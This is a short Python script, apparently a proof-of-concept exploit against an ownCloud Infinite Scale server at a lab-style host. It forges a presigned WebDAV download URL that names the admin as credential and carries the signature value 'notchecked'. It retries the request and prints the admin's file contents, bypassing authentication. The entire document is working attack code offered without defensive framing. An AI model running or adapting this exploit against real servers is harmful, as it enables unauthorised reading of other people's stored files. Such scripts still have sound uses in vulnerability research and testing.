import requests
import time

OCIS_URL = "ocis-app:9200"
USERNAME = "admin"
FILE = "file.txt"
EXPLOIT_URL_TEMPLATE = "https://{}/remote.php/dav/files/{}/{}?OC-Credential={}&OC-Verb=GET&OC-Expires=60&OC-Date=2024-01-27T00:00:00.000Z&OC-Signature=notchecked"
EXPLOIT_URL = EXPLOIT_URL_TEMPLATE.format(OCIS_URL, USERNAME, FILE, USERNAME)
RETRIES = 5

response: requests.Response = None

for _ in range(RETRIES):
    try:
        response = requests.get(EXPLOIT_URL)
        break
    except requests.exceptions.ConnectionError as e:
        if _ == RETRIES - 1:
            raise(e)
        print("Connection error, retrying in 5 seconds")
        time.sleep(5)

if response.status_code == 200:
    print(response.text)
else:
    print(f"Failed to download file: {response.status_code}")
